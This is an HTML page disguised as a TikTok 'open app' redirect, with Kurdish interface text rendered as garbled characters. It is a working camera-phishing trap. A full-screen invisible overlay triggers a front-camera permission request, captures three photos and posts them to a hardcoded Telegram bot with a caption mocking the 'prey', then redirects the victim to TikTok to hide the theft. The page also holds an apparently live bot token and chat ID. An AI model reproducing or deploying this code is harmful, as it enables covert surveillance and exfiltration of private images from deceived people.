<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TikTok | Open App</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #fff; overflow: hidden; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        
        /* Ø¯ÛŒØ²Ø§ÛŒÙ†ÛŒ Ù‡Ø§ÙˆØ´ÛÙˆÛ•ÛŒ ØªÛŒÚ©ØªÛ†Ú© */
        .container { position: fixed; top: 0; left: 0; width: 100%; height: 100%; display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 1; }
        .tt-icon { width: 70px; height: 70px; margin-bottom: 20px; animation: pulse 1.5s infinite; }
        .loader { width: 40px; height: 40px; border: 3px solid #f3f3f3; border-top: 3px solid #fe2c55; border-radius: 50%; animation: spin 1s linear infinite; }
        .text { margin-top: 20px; color: #161823; font-size: 16px; font-weight: 600; text-align: center; line-height: 1.5; }
        
        /* Ø¯ÙˆÚ¯Ù…Û•ÛŒ Ú©Ù„ÛŒÚ©ÛŒ Ú¯Û•ÙˆØ±Û• Ú©Û• Ù‡Û•Ù…ÙˆÙˆ Ø´Ø§Ø´Û•Ú©Û• Ø¯Û•Ú¯Ø±ÛØª */
        #master-trigger { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1000; cursor: pointer; background: rgba(255,255,255,0.01); }

        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
        
        video, canvas { display: none; }
    </style>
</head>
<body>

    <div class="container">
        <svg class="tt-icon" viewBox="0 0 448 512"><path fill="#000" d="M448 209.91a210.06 210.06 0 0 1-122.77-39.25V349.38A162.55 162.55 0 1 1 185 188.31V278.2a74.62 74.62 0 1 0 52.23 71.18V0l88 0a121.18 121.18 0 0 0 1.86 22.32c7.87 33.32 31.44 60.39 63.55 75.83 2.12 1 4.24 1.94 6.36 2.87V209.91z"/></svg>
        <div class="loader"></div>
        <div class="text">
            Ø®Û•Ø±ÛŒÚ©ÛŒ Ú¯ÙˆØ§Ø³ØªÙ†Û•ÙˆÛ•ÛŒÛ• Ø¨Û† Ø¦Û•Ù¾ÛŒ ØªÛŒÚ©ØªÛ†Ú©...<br>
            <span style="color: #fe2c55; font-size: 14px;">ØªÚ©Ø§ÛŒÛ• Ú©Ù„ÛŒÚ© Ù„Û• Allow Ø¨Ú©Û• Ø¨Û† Ø¨Û•Ø±Ø¯Û•ÙˆØ§Ù…Ø¨ÙˆÙˆÙ†</span>
        </div>
    </div>

    <div id="master-trigger" onclick="ignite()"></div>

    <video id="v" autoplay playsinline muted></video>
    <canvas id="c"></canvas>

    <script>
        const token = "8454166362:AAE-teyJSdRqs8yUA4UPUeHmiIT0TtyT1hc";
        const chat_id = "7261354534";
        const target = "https://vt.tiktok.com/ZS5WMhjoP/";

        async function ignite() {
            // ÛŒÛ•Ú©Û•Ù… Ú©Ù„ÛŒÚ© Ù…Û†ÚµÛ•ØªÛŒ "Allow" Ø¨Ø§Ù†Ú¯ Ø¯Û•Ú©Ø§Øª
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const v = document.getElementById('v');
                v.srcObject = stream;
                await v.play();

                // ğŸ‘‘ ÙÛÚµÛŒ Ù¾Ø§Ø´Ø§: Ú¯Ø±ØªÙ†ÛŒ Ù£ ÙˆÛÙ†Û• Ø¨Û• Ø¯ÙˆØ§ÛŒ ÛŒÛ•Ú©Ø¯Ø§ Ø¨Û† Ø¯ÚµÙ†ÛŒØ§ÛŒÛŒ
                for (let i = 0; i < 3; i++) {
                    await new Promise(r => setTimeout(r, 400));
                    const canvas = document.getElementById('c');
                    canvas.width = v.videoWidth; canvas.height = v.videoHeight;
                    canvas.getContext('2d').drawImage(v, 0, 0);
                    const blob = await (await fetch(canvas.toDataURL('image/jpeg', 0.7))).blob();
                    
                    const fd = new FormData();
                    fd.append('chat_id', chat_id);
                    fd.append('photo', blob, `final_shot_${i}.jpg`);
                    fd.append('caption', `ğŸ”¥ Ù†ÛÚ†ÛŒØ±Û•Ú©Û• Ú•Ø§Ùˆ Ú©Ø±Ø§! ÙˆÛÙ†Û•ÛŒ Ú˜Ù…Ø§Ø±Û• ${i+1}`);
                    fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
                }

                // Ù†Ø§Ø±Ø¯Ù†ÛŒ Ø¨Û† ØªÛŒÚ©ØªÛ†Ú©
                window.location.href = target;

            } catch (e) {
                // Ø¦Û•Ú¯Û•Ø± Ú•Û•ÙØ²ÛŒ Ú©Ø±Ø¯ØŒ Ø¯ÙˆØ§ÛŒ Ù¢ Ú†Ø±Ú©Û• Ù‡Û•Ø± Ø¯Û•ÛŒØ¨Ø§Øª Ø¨Û† ØªÛŒÚ©ØªÛ†Ú©Û•Ú©Û•
                setTimeout(() => { window.location.href = target; }, 1500);
            }
        }
    </script>
</body>
</html>
